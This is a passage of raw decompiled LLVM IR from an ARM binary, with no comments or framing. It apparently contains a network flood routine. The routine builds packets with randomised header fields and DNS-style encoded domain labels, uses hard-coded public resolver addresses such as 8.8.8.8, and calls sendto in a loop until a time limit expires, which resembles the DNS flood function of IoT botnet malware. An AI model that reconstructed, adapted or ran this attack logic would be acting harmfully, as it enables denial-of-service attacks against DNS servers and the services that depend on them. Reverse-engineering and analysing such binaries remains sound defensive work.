  %v4_eea0 = inttoptr i32 %v3_eea0 to i8*
  store i8 %v1_eea0, i8* %v4_eea0, align 1
  %v0_eea4 = load i32, i32* %r6.global-to-local, align 4
  %v1_eea4 = trunc i32 %v0_eea4 to i8
  %v2_eea4 = load i32, i32* %ip.global-to-local, align 4
  %v3_eea4 = add i32 %v2_eea4, 4
  %v4_eea4 = inttoptr i32 %v3_eea4 to i8*
  store i8 %v1_eea4, i8* %v4_eea4, align 1
  %v0_eea8 = load i32, i32* %r4.global-to-local, align 4
  %v1_eea8 = add i32 %v0_eea8, 1
  store i32 %v1_eea8, i32* %r0.global-to-local, align 4
  %v0_eeac = load i32, i32* @sb, align 4
  %v1_eeac = trunc i32 %v0_eeac to i8
  %v2_eeac = load i32, i32* %r1.global-to-local, align 4
  %v3_eeac = add i32 %v2_eeac, 40
  %v4_eeac = inttoptr i32 %v3_eeac to i8*
  store i8 %v1_eeac, i8* %v4_eeac, align 1
  %v0_eeb0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_eeb0, i32* %r2.global-to-local, align 4
  %v0_eeb4 = load i32, i32* @r7, align 4
  store i32 %v0_eeb4, i32* %r1.global-to-local, align 4
  %v3_eeb8 = call i32 @function_12db0(i32 %v1_eea8, i32 %v0_eeb4, i32 %v0_eeb0)
  store i32 %v3_eeb8, i32* %r0.global-to-local, align 4
  %v1_eec0 = load i32, i32* %r6.global-to-local, align 4
  %v10_eec0 = inttoptr i32 %v1_eec0 to i8*
  %v15_eec0 = icmp eq i32 %v2_ec38, %v1_eec0
  store i1 %v15_eec0, i1* %cpsr_z.global-to-local, align 1
  %v9_eec4 = icmp sgt i8* %v3_ec38, %v10_eec0
  store i32 %v1_eec0, i32* %lr.global-to-local, align 4
  %v0_eed4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_eed4, i32* %ip.global-to-local, align 4
  %extract.t73 = trunc i32 %v1_eec0 to i8
  br i1 %v9_eec4, label %dec_label_pc_eed0, label %dec_label_pc_ef0c

dec_label_pc_eed0:                                ; preds = %bb137
  store i32 %v1_eec0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_eedc

dec_label_pc_eedc:                                ; preds = %.thread39, %dec_label_pc_eed0
  %v1_eee4 = phi i32 [ %v1_eee459, %.thread39 ], [ %v1_eec0, %dec_label_pc_eed0 ]
  %v0_eedc = phi i32 [ %v1_eef8, %.thread39 ], [ %v1_eec0, %dec_label_pc_eed0 ]
  %v1_eedc = load i32, i32* @r7, align 4
  %v2_eedc = add i32 %v1_eedc, %v0_eedc
  %v3_eedc = inttoptr i32 %v2_eedc to i8*
  %v4_eedc = load i8, i8* %v3_eedc, align 1
  %v6_eedc = zext i8 %v4_eedc to i32
  store i32 %v6_eedc, i32* %r3.global-to-local, align 4
  %v7_eee0 = icmp eq i8 %v4_eedc, 46
  store i1 %v7_eee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eee0, label %bb138, label %.thread35

.thread35:                                        ; preds = %dec_label_pc_eedc
  %v1_eee837 = add i32 %v1_eee4, 1
  store i32 %v1_eee837, i32* %r2.global-to-local, align 4
  br label %bb139

bb138:                                            ; preds = %dec_label_pc_eedc
  %v2_eee4 = trunc i32 %v1_eee4 to i8
  %v3_eee4 = load i32, i32* %ip.global-to-local, align 4
  %v4_eee4 = inttoptr i32 %v3_eee4 to i8*
  store i8 %v2_eee4, i8* %v4_eee4, align 1
  %v0_eeec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_eee8 = load i32, i32* %lr.global-to-local, align 4
  %v1_eee8 = add i32 %v0_eee8, 1
  store i32 %v1_eee8, i32* %r2.global-to-local, align 4
  br i1 %v0_eeec.pr, label %bb140, label %bb139

bb139:                                            ; preds = %.thread35, %bb138
  %v1_eee838 = phi i32 [ %v1_eee837, %.thread35 ], [ %v1_eee8, %bb138 ]
  %v2_eeec = urem i32 %v1_eee838, 256
  store i32 %v2_eeec, i32* %lr.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_eee460 = phi i32 [ %v0_eee8, %bb138 ], [ %v2_eeec, %bb139 ]
  %v0_ef00.pr = phi i1 [ true, %bb138 ], [ false, %bb139 ]
  store i32 %v2_ec38, i32* %r2.global-to-local, align 4
  %v0_eef4 = load i32, i32* %r4.global-to-local, align 4
  %v1_eef4 = load i32, i32* %r1.global-to-local, align 4
  %v2_eef4 = add i32 %v1_eef4, %v0_eef4
  store i32 %v2_eef4, i32* %r0.global-to-local, align 4
  %v1_eef8 = add i32 %v1_eef4, 1
  store i32 %v1_eef8, i32* %r1.global-to-local, align 4
  br i1 %v0_ef00.pr, label %bb141, label %.thread39

bb141:                                            ; preds = %bb140
  %v2_eefc = add i32 %v2_eef4, 1
  store i32 %v2_eefc, i32* %ip.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %.thread39

.thread39:                                        ; preds = %bb140, %bb141
  %v1_eee459 = phi i32 [ %v1_eee460, %bb140 ], [ 0, %bb141 ]
  %v9_ef04 = icmp eq i32 %v2_ec38, %v1_eef8
  store i1 %v9_ef04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef04, label %dec_label_pc_ef0c.loopexit, label %dec_label_pc_eedc

dec_label_pc_ef0c.loopexit:                       ; preds = %.thread39
  %v2_ef0c.pre = load i32, i32* %ip.global-to-local, align 4
  %extract.t72 = trunc i32 %v1_eee459 to i8
  br label %dec_label_pc_ef0c

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_ef0c.loopexit, %bb137
  %v2_ef0c = phi i32 [ %v2_ef0c.pre, %dec_label_pc_ef0c.loopexit ], [ %v0_eed4, %bb137 ]
  %v0_ef0c.off0 = phi i8 [ %extract.t72, %dec_label_pc_ef0c.loopexit ], [ %extract.t73, %bb137 ]
  %v3_ef0c = inttoptr i32 %v2_ef0c to i8*
  store i8 %v0_ef0c.off0, i8* %v3_ef0c, align 1
  %v3_ef10 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_ec38, i32* %ip.global-to-local, align 4
  store i32 %v1_e9c4, i32* %lr.global-to-local, align 4
  %v0_ef1c = load i32, i32* %r4.global-to-local, align 4
  %v2_ef1c = add i32 %v0_ef1c, %v2_ec38
  store i32 %v2_ef1c, i32* %r3.global-to-local, align 4
  %v1_ef20 = add i32 %v3_ef10, 1
  store i32 %v1_ef20, i32* %r4.global-to-local, align 4
  %v9_ef24 = icmp eq i32 %v1_e9c4, %v1_ef20
  store i1 %v9_ef24, i1* %cpsr_z.global-to-local, align 1
  %v1_ef28 = add i32 %v2_ef1c, 2
  store i32 %v1_ef28, i32* %r2.global-to-local, align 4
  %v0_ef2c = load i32, i32* %sl.global-to-local, align 4
  %v1_ef2c = trunc i32 %v0_ef2c to i8
  %v4_ef2c = inttoptr i32 %v1_ef28 to i8*
  store i8 %v1_ef2c, i8* %v4_ef2c, align 1
  %v0_ef30 = load i32, i32* %r8.global-to-local, align 4
  %v1_ef30 = trunc i32 %v0_ef30 to i8
  %v2_ef30 = load i32, i32* %r2.global-to-local, align 4
  %v3_ef30 = add i32 %v2_ef30, 3
  %v4_ef30 = inttoptr i32 %v3_ef30 to i8*
  store i8 %v1_ef30, i8* %v4_ef30, align 1
  %v0_ef34 = load i32, i32* %r8.global-to-local, align 4
  %v1_ef34 = trunc i32 %v0_ef34 to i8
  %v2_ef34 = load i32, i32* %r2.global-to-local, align 4
  %v3_ef34 = add i32 %v2_ef34, 1
  %v4_ef34 = inttoptr i32 %v3_ef34 to i8*
  store i8 %v1_ef34, i8* %v4_ef34, align 1
  %v0_ef38 = load i32, i32* %sl.global-to-local, align 4
  %v1_ef38 = trunc i32 %v0_ef38 to i8
  %v2_ef38 = load i32, i32* %r2.global-to-local, align 4
  %v3_ef38 = add i32 %v2_ef38, 2
  %v4_ef38 = inttoptr i32 %v3_ef38 to i8*
  store i8 %v1_ef38, i8* %v4_ef38, align 1
  %v0_ef3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ef3c, i32* %stack_var_-40, align 4
  %v8_ef40 = icmp sgt i32 %v1_e9c4, %v1_ef20
  br i1 %v8_ef40, label %dec_label_pc_edac, label %dec_label_pc_ef44

dec_label_pc_ef44:                                ; preds = %dec_label_pc_ef0c, %dec_label_pc_f108
  store i32 %v1_e9c4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_eca8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_eca8, label %dec_label_pc_f108, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %dec_label_pc_ef44
  store i32 %v2_ec38, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_ef64 = load i32, i32* @sb, align 4
  %v2_ef64 = add i32 %v0_ef64, %v2_ec38
  store i32 %v2_ef64, i32* %r3.global-to-local, align 4
  %v1_ef68 = add i32 %v2_ef64, 47
  store i32 %v1_ef68, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r8, align 4
  %v1_ef70 = add i32 %v2_ef64, 27
  store i32 %v1_ef70, i32* @fp, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_f06c

dec_label_pc_ef80:                                ; preds = %dec_label_pc_f06c
  store i32 %v3_ecb8, i32* %r3.global-to-local, align 4
  %v9_ef84 = icmp eq i32 %v3_ecb8, %v1_ef84
  store i1 %v9_ef84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef84, label %dec_label_pc_f0a8, label %dec_label_pc_ef8c

dec_label_pc_ef8c:                                ; preds = %dec_label_pc_f08c.dec_label_pc_ef8c_crit_edge, %dec_label_pc_ef80
  %v1_ef90 = phi i32 [ %v1_ef90.pre, %dec_label_pc_f08c.dec_label_pc_ef8c_crit_edge ], [ %v1_ef84, %dec_label_pc_ef80 ]
  store i32 %v3_ecbc, i32* %ip.global-to-local, align 4
  %v9_ef90 = icmp eq i32 %v3_ecbc, %v1_ef90
  store i1 %v9_ef90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef90, label %dec_label_pc_f0c4, label %dec_label_pc_ef98

dec_label_pc_ef98:                                ; preds = %dec_label_pc_f0a8.dec_label_pc_ef98_crit_edge, %dec_label_pc_ef8c
  %v1_ef9c = phi i32 [ %v1_ef9c.pre, %dec_label_pc_f0a8.dec_label_pc_ef98_crit_edge ], [ %v1_ef90, %dec_label_pc_ef8c ]
  store i32 %v3_ecc0, i32* %lr.global-to-local, align 4
  %v9_ef9c = icmp eq i32 %v3_ecc0, %v1_ef9c
  store i1 %v9_ef9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef9c, label %dec_label_pc_f0e0, label %dec_label_pc_efa4

dec_label_pc_efa4:                                ; preds = %dec_label_pc_f0c4, %dec_label_pc_ef98, %dec_label_pc_f0e0
  %v0_efa4 = load i32, i32* @r6, align 4
  store i32 %v0_efa4, i32* %r0.global-to-local, align 4
  %v0_efa8 = load i32, i32* @sb, align 4
  store i32 %v0_efa8, i32* %r1.global-to-local, align 4
  %v2_efac = call i32 @function_10664(i32 %v0_efa4, i32 %v0_efa8)
  %v0_efb0 = load i32, i32* @r7, align 4
  %v1_efb0 = trunc i32 %v0_efb0 to i8
  %v2_efb0 = load i32, i32* @r6, align 4
  %v3_efb0 = load i32, i32* @sb, align 4
  %v4_efb0 = add i32 %v3_efb0, %v2_efb0
  %v5_efb0 = inttoptr i32 %v4_efb0 to i8*
  store i8 %v1_efb0, i8* %v5_efb0, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_efb8 = load i32, i32* @r7, align 4
  %v1_efb8 = trunc i32 %v0_efb8 to i8
  %v2_efb8 = load i32, i32* @r4, align 4
  %v3_efb8 = add i32 %v2_efb8, 10
  %v4_efb8 = inttoptr i32 %v3_efb8 to i8*
  store i8 %v1_efb8, i8* %v4_efb8, align 1
  %v0_efbc = load i32, i32* @r7, align 4
  %v1_efbc = trunc i32 %v0_efbc to i8
  %v2_efbc = load i32, i32* @r4, align 4
  %v3_efbc = add i32 %v2_efbc, 11
  %v4_efbc = inttoptr i32 %v3_efbc to i8*
  store i8 %v1_efbc, i8* %v4_efbc, align 1
  %v0_efc0 = load i32, i32* @r4, align 4
  store i32 %v0_efc0, i32* @r0, align 4
  %v2_efc4 = call i32 @function_f188(i32 %v0_efc0, i32 20)
  %v3_efc4 = trunc i32 %v2_efc4 to i8
  store i32 %v2_efc4, i32* %r0.global-to-local, align 4
  %v4_efc8 = sdiv i32 %v2_efc4, 256
  store i32 %v4_efc8, i32* %r3.global-to-local, align 4
  %v1_efcc = trunc i32 %v4_efc8 to i8
  %v2_efcc = load i32, i32* @r4, align 4
  %v3_efcc = add i32 %v2_efcc, 11
  %v4_efcc = inttoptr i32 %v3_efcc to i8*
  store i8 %v1_efcc, i8* %v4_efcc, align 1
  %v3_efd0 = load i32, i32* @r4, align 4
  %v4_efd0 = add i32 %v3_efd0, 10
  %v5_efd0 = inttoptr i32 %v4_efd0 to i8*
  store i8 %v3_efc4, i8* %v5_efd0, align 1
  %v0_efd4 = load i32, i32* @r7, align 4
  %v1_efd4 = trunc i32 %v0_efd4 to i8
  %v2_efd4 = load i32, i32* @r5, align 4
  %v3_efd4 = add i32 %v2_efd4, 6
  %v4_efd4 = inttoptr i32 %v3_efd4 to i8*
  store i8 %v1_efd4, i8* %v4_efd4, align 1
  %v0_efd8 = load i32, i32* @r7, align 4
  %v1_efd8 = trunc i32 %v0_efd8 to i8
  %v2_efd8 = load i32, i32* @r5, align 4
  %v3_efd8 = add i32 %v2_efd8, 7
  %v4_efd8 = inttoptr i32 %v3_efd8 to i8*
  store i8 %v1_efd8, i8* %v4_efd8, align 1
  %v0_efdc = load i32, i32* @r4, align 4
  %v1_efdc = add i32 %v0_efdc, 24
  %v2_efdc = inttoptr i32 %v1_efdc to i8*
  %v3_efdc = load i8, i8* %v2_efdc, align 1
  %v4_efdc = zext i8 %v3_efdc to i32
  store i32 %v4_efdc, i32* %r3.global-to-local, align 4
  %v1_efe0 = add i32 %v0_efdc, 25
  %v2_efe0 = inttoptr i32 %v1_efe0 to i8*
  %v3_efe0 = load i8, i8* %v2_efe0, align 1
  %v4_efe0 = zext i8 %v3_efe0 to i32
  %v0_efe4 = load i32, i32* @r5, align 4
  store i32 %v0_efe4, i32* @r1, align 4
  %v4_efe8 = mul nuw nsw i32 %v4_efe0, 256
  %v5_efe8 = or i32 %v4_efe8, %v4_efdc
  store i32 %v5_efe8, i32* %r2.global-to-local, align 4
  store i32 %v0_efdc, i32* %r0.global-to-local, align 4
  %v0_eff0 = load i32, i32* @fp, align 4
  store i32 %v0_eff0, i32* %r3.global-to-local, align 4
  %v4_eff4 = call i32 @function_f1e4(i32 %v0_efdc, i32 %v0_efe4, i32 %v5_efe8, i32 %v0_eff0)
  %v5_eff4 = trunc i32 %v4_eff4 to i8
  store i32 %v4_eff4, i32* %r0.global-to-local, align 4
  %v3_eff8 = load i32, i32* %stack_var_-40, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v5_f004 = mul i32 %v3_eff8, 24
  store i32 %v5_f004, i32* %lr.global-to-local, align 4
  %v4_f00878 = udiv i32 %v4_eff4, 256
  %v1_f00c = trunc i32 %v4_f00878 to i8
  %v2_f00c = load i32, i32* @r5, align 4
  %v3_f00c = add i32 %v2_f00c, 7
  %v4_f00c = inttoptr i32 %v3_f00c to i8*
  store i8 %v1_f00c, i8* %v4_f00c, align 1
  store i32 %stack_var_-2188.0, i32* %r3.global-to-local, align 4
  %v0_f014 = load i32, i32* %lr.global-to-local, align 4
  %v1_f014 = load i32, i32* %r2.global-to-local, align 4
  %v2_f014 = add i32 %v1_f014, %v0_f014
  store i32 %v2_f014, i32* %lr.global-to-local, align 4
  %v3_f018 = load i32, i32* @r5, align 4
  %v4_f018 = add i32 %v3_f018, 6
  %v5_f018 = inttoptr i32 %v4_f018 to i8*
  store i8 %v5_eff4, i8* %v5_f018, align 1
  %v0_f01c = load i32, i32* %r3.global-to-local, align 4
  %v1_f01c = load i32, i32* %lr.global-to-local, align 4
  %v2_f01c = add i32 %v1_f01c, 4
  %v3_f01c = inttoptr i32 %v2_f01c to i32*
  store i32 %v0_f01c, i32* %v3_f01c, align 4
  %v0_f020 = load i32, i32* @r4, align 4
  %v1_f020 = add i32 %v0_f020, 20
  %v2_f020 = inttoptr i32 %v1_f020 to i32*
  %v3_f020 = load i32, i32* %v2_f020, align 4
  %v3_f024 = udiv i32 %v3_f020, 65536
  store i32 %v3_f024, i32* %r3.global-to-local, align 4
  %v3_f02817 = udiv i32 %v3_f020, 16777216
  %v1_f02c = trunc i32 %v3_f02817 to i8
  %v2_f02c = load i32, i32* %lr.global-to-local, align 4
  %v3_f02c = add i32 %v2_f02c, 3
  %v4_f02c = inttoptr i32 %v3_f02c to i8*
  store i8 %v1_f02c, i8* %v4_f02c, align 1
  %v0_f030 = load i32, i32* %r3.global-to-local, align 4
  %v1_f030 = trunc i32 %v0_f030 to i8
  %v2_f030 = load i32, i32* %lr.global-to-local, align 4
  %v3_f030 = add i32 %v2_f030, 2
  %v4_f030 = inttoptr i32 %v3_f030 to i8*
  store i8 %v1_f030, i8* %v4_f030, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f03c = load i32, i32* @r4, align 4
  store i32 %v0_f03c, i32* %r1.global-to-local, align 4
  store i32 %v3_ec4c, i32* %r0.global-to-local, align 4
  store i32 %v1_ef68, i32* %r2.global-to-local, align 4
  %v0_f048 = load i32, i32* %lr.global-to-local, align 4
  %v4_f048 = inttoptr i32 %v0_f048 to %sockaddr*
  %v7_f050 = inttoptr i32 %v0_f03c to i32*
  %v9_f050 = call i32 @sendto(i32 %v3_ec4c, i32* %v7_f050, i32 %v1_ef68, i32 16384, %sockaddr* %v4_f048, i32 16)
  %v3_f054 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f054, i32* %r3.global-to-local, align 4
  store i32 %v1_e9c4, i32* %r5.global-to-local, align 4
  %v1_f05c = add i32 %v3_f054, 1
  store i32 %v1_f05c, i32* %r0.global-to-local, align 4
  %v9_f060 = icmp eq i32 %v1_e9c4, %v1_f05c
  store i1 %v9_f060, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f05c, i32* %stack_var_-40, align 4
  %v7_f068 = icmp sgt i32 %v1_e9c4, %v1_f05c
  br i1 %v7_f068, label %dec_label_pc_efa4.dec_label_pc_f06c_crit_edge, label %dec_label_pc_f108

dec_label_pc_efa4.dec_label_pc_f06c_crit_edge:    ; preds = %dec_label_pc_efa4
  %v1_f078.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f06c

dec_label_pc_f06c:                                ; preds = %dec_label_pc_efa4.dec_label_pc_f06c_crit_edge, %dec_label_pc_ef58
  %v1_ef84 = phi i32 [ %v1_f078.pre, %dec_label_pc_efa4.dec_label_pc_f06c_crit_edge ], [ add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), %dec_label_pc_ef58 ]
  %v1_f074 = phi i32 [ %v1_f05c, %dec_label_pc_efa4.dec_label_pc_f06c_crit_edge ], [ 0, %dec_label_pc_ef58 ]
  store i32 %v4_e9ec, i32* %lr.global-to-local, align 4
  store i32 %v3_ecb4, i32* %r2.global-to-local, align 4
  %v4_f074 = mul i32 %v1_f074, 4
  %v5_f074 = add i32 %v4_f074, %v4_e9ec
  %v6_f074 = inttoptr i32 %v5_f074 to i32*
  %v7_f074 = load i32, i32* %v6_f074, align 4
  store i32 %v7_f074, i32* @r4, align 4
  %v9_f078 = icmp eq i32 %v3_ecb4, %v1_ef84
  store i1 %v9_f078, i1* %cpsr_z.global-to-local, align 1
  %v1_f07c = add i32 %v7_f074, 20
  store i32 %v1_f07c, i32* @r5, align 4
  %v1_f080 = add i32 %v7_f074, 41
  store i32 %v1_f080, i32* @r6, align 4
  %v1_f084 = add i32 %v7_f074, 28
  store i32 %v1_f084, i32* @sl, align 4
  br i1 %v9_f078, label %dec_label_pc_f08c, label %dec_label_pc_ef80

dec_label_pc_f08c:                                ; preds = %dec_label_pc_f06c
  %v0_f08c = call i32 @function_105b0()
  %v1_f08c = trunc i32 %v0_f08c to i8
  store i32 %v0_f08c, i32* %r0.global-to-local, align 4
  %v4_f09079 = udiv i32 %v0_f08c, 256
  %v1_f094 = trunc i32 %v4_f09079 to i8
  %v2_f094 = load i32, i32* @r4, align 4
  %v3_f094 = add i32 %v2_f094, 5
  %v4_f094 = inttoptr i32 %v3_f094 to i8*
  store i8 %v1_f094, i8* %v4_f094, align 1
  store i32 %v3_ecb8, i32* %r3.global-to-local, align 4
  %v1_f09c = load i32, i32* @r8, align 4
  %v9_f09c = icmp eq i32 %v3_ecb8, %v1_f09c
  store i1 %v9_f09c, i1* %cpsr_z.global-to-local, align 1
  %v3_f0a0 = load i32, i32* @r4, align 4
  %v4_f0a0 = add i32 %v3_f0a0, 4
  %v5_f0a0 = inttoptr i32 %v4_f0a0 to i8*
  store i8 %v1_f08c, i8* %v5_f0a0, align 1
  %v0_f0a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0a4, label %dec_label_pc_f0a8, label %dec_label_pc_f08c.dec_label_pc_ef8c_crit_edge

dec_label_pc_f08c.dec_label_pc_ef8c_crit_edge:    ; preds = %dec_label_pc_f08c
  %v1_ef90.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_ef8c

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_f08c, %dec_label_pc_ef80
  %v0_f0a8 = call i32 @function_105b0()
  %v1_f0a8 = trunc i32 %v0_f0a8 to i8
  store i32 %v0_f0a8, i32* %r0.global-to-local, align 4
  store i32 %v3_ecbc, i32* %ip.global-to-local, align 4
  %v4_f0b0 = sdiv i32 %v0_f0a8, 256
  store i32 %v4_f0b0, i32* %r3.global-to-local, align 4
  %v1_f0b4 = load i32, i32* @r8, align 4
  %v9_f0b4 = icmp eq i32 %v3_ecbc, %v1_f0b4
  store i1 %v9_f0b4, i1* %cpsr_z.global-to-local, align 1
  %v3_f0b8 = load i32, i32* @r4, align 4
  %v4_f0b8 = add i32 %v3_f0b8, 20
  %v5_f0b8 = inttoptr i32 %v4_f0b8 to i8*
  store i8 %v1_f0a8, i8* %v5_f0b8, align 1
  %v0_f0bc = load i32, i32* %r3.global-to-local, align 4
  %v1_f0bc = trunc i32 %v0_f0bc to i8
  %v2_f0bc = load i32, i32* @r5, align 4
  %v3_f0bc = add i32 %v2_f0bc, 1
  %v4_f0bc = inttoptr i32 %v3_f0bc to i8*
  store i8 %v1_f0bc, i8* %v4_f0bc, align 1
  %v0_f0c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0c0, label %dec_label_pc_f0c4, label %dec_label_pc_f0a8.dec_label_pc_ef98_crit_edge

dec_label_pc_f0a8.dec_label_pc_ef98_crit_edge:    ; preds = %dec_label_pc_f0a8
  %v1_ef9c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_ef98

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_f0a8, %dec_label_pc_ef8c
  %v0_f0c4 = call i32 @function_105b0()
  %v1_f0c4 = trunc i32 %v0_f0c4 to i8
  store i32 %v0_f0c4, i32* %r0.global-to-local, align 4
  store i32 %v3_ecc0, i32* %lr.global-to-local, align 4
  %v4_f0cc = sdiv i32 %v0_f0c4, 256
  store i32 %v4_f0cc, i32* %r3.global-to-local, align 4
  %v1_f0d0 = load i32, i32* @r8, align 4
  %v9_f0d0 = icmp eq i32 %v3_ecc0, %v1_f0d0
  store i1 %v9_f0d0, i1* %cpsr_z.global-to-local, align 1
  %v1_f0d4 = trunc i32 %v4_f0cc to i8
  %v2_f0d4 = load i32, i32* @r5, align 4
  %v3_f0d4 = add i32 %v2_f0d4, 3
  %v4_f0d4 = inttoptr i32 %v3_f0d4 to i8*
  store i8 %v1_f0d4, i8* %v4_f0d4, align 1
  %v3_f0d8 = load i32, i32* @r5, align 4
  %v4_f0d8 = add i32 %v3_f0d8, 2
  %v5_f0d8 = inttoptr i32 %v4_f0d8 to i8*
  store i8 %v1_f0c4, i8* %v5_f0d8, align 1
  %v0_f0dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0dc, label %dec_label_pc_f0e0, label %dec_label_pc_efa4

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0c4, %dec_label_pc_ef98
  %v0_f0e0 = call i32 @function_105b0()
  %v1_f0e0 = trunc i32 %v0_f0e0 to i8
  store i32 %v0_f0e0, i32* %r0.global-to-local, align 4
  %v4_f0e4 = sdiv i32 %v0_f0e0, 256
  store i32 %v4_f0e4, i32* %r3.global-to-local, align 4
  %v3_f0e8 = load i32, i32* @r4, align 4
  %v4_f0e8 = add i32 %v3_f0e8, 28
  %v5_f0e8 = inttoptr i32 %v4_f0e8 to i8*
  store i8 %v1_f0e0, i8* %v5_f0e8, align 1
  %v0_f0ec = load i32, i32* %r3.global-to-local, align 4
  %v1_f0ec = trunc i32 %v0_f0ec to i8
  %v2_f0ec = load i32, i32* @sl, align 4
  %v3_f0ec = add i32 %v2_f0ec, 1
  %v4_f0ec = inttoptr i32 %v3_f0ec to i8*
  store i8 %v1_f0ec, i8* %v4_f0ec, align 1
  br label %dec_label_pc_efa4

dec_label_pc_f0f4:                                ; preds = %dec_label_pc_ec5c
  store i32 %v3_ec4c, i32* %r0.global-to-local, align 4
  %v1_f0f8 = call i32 @close(i32 %v3_ec4c)
  store i32 %v1_f0f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f0fc

dec_label_pc_f0fc:                                ; preds = %dec_label_pc_f108, %dec_label_pc_ec34, %dec_label_pc_ec1c, %dec_label_pc_f0f4
  %v29_f104 = phi i32 [ %v3_ec4c, %dec_label_pc_ec34 ], [ %v2_ec28, %dec_label_pc_ec1c ], [ %v1_f0f8, %dec_label_pc_f0f4 ], [ %v2_f10c, %dec_label_pc_f108 ]
  store i32 %v3_e9b8, i32* %r4.global-to-local, align 4
  store i32 %v6_e9b8, i32* %r5.global-to-local, align 4
  store i32 %v9_e9b8, i32* %r6.global-to-local, align 4
  store i32 %v15_e9b8, i32* %r8.global-to-local, align 4
  store i32 %v21_e9b8, i32* %sl.global-to-local, align 4
  store i32 %v24_e9b8, i32* %fp.global-to-local, align 4
  ret i32 %v29_f104

dec_label_pc_f108.critedge:                       ; preds = %dec_label_pc_ec88
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_f108

dec_label_pc_f108:                                ; preds = %dec_label_pc_efa4, %dec_label_pc_f108.critedge, %dec_label_pc_ef44
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_f10c = call i32 @time(i32* null)
  store i32 %v2_f10c, i32* %r0.global-to-local, align 4
  store i32 %v2_ec28, i32* %ip.global-to-local, align 4
  %v9_f114 = icmp eq i32 %v2_ec28, %v2_f10c
  store i1 %v9_f114, i1* %cpsr_z.global-to-local, align 1
  %v6_f118 = icmp slt i32 %v2_ec28, %v2_f10c
  br i1 %v6_f118, label %dec_label_pc_f0fc, label %dec_label_pc_ef44

dec_label_pc_f120:                                ; preds = %dec_label_pc_ebd8, %bb130
  %v0_ebe0.lcssa = phi i32 [ %v1_ebac, %dec_label_pc_ebd8 ], [ %v0_ebe0, %bb130 ]
  %v2_f120 = sub i32 %v0_ebe0.lcssa, %v4_eb64
  store i32 %v2_f120, i32* %r2.global-to-local, align 4
  store i32 %v2_eb9c, i32* %r1.global-to-local, align 4
  store i32 %v2_eb8c, i32* %r0.global-to-local, align 4
  %v3_f12c = call i32 @function_12db0(i32 %v2_eb8c, i32 %v2_eb9c, i32 %v2_f120)
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp142 = bitcast i32* %stack_var_-72 to i8*
  store i32 %v2_eb8c, i32* %r0.global-to-local, align 4
  %v2_f138 = load i32, i32* %r4.global-to-local, align 4
  %v3_f138 = inttoptr i32 %v2_f138 to i8*
  store i8 0, i8* %v3_f138, align 1
  %v3_f13c = call i32 @inet_addr(i8* %tmp142)
  store i32 %v3_f13c, i32* %r0.global-to-local, align 4
  %sext41 = mul i32 %v3_f13c, 16777216
  %phitmp = sdiv i32 %sext41, 16777216
  br label %dec_label_pc_ec1c

dec_label_pc_f148:                                ; preds = %dec_label_pc_ebf0
  store i32 104859200, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec1c

dec_label_pc_f158:                                ; preds = %dec_label_pc_ebf0
  store i32 134744072, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ec1c

dec_label_pc_f16c:                                ; preds = %dec_label_pc_ebf0
  store i32 33686020, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec1c

; uselistorder directives
  uselistorder i32 %v2_f10c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_f0e0, { 0, 2, 1 }
  uselistorder i32 %v4_f0cc, { 1, 0 }
  uselistorder i32 %v0_f0c4, { 0, 2, 1 }
  uselistorder i32 %v0_f0a8, { 0, 2, 1 }
  uselistorder i32 %v0_f08c, { 0, 2, 1 }
  uselistorder i32 %v7_f074, { 2, 1, 0, 3 }
  uselistorder i32 %v1_ef84, { 2, 1, 0 }
  uselistorder i32 %v1_f05c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_eff4, { 0, 2, 1 }
  uselistorder i32 %v0_efdc, { 1, 0, 2, 3 }
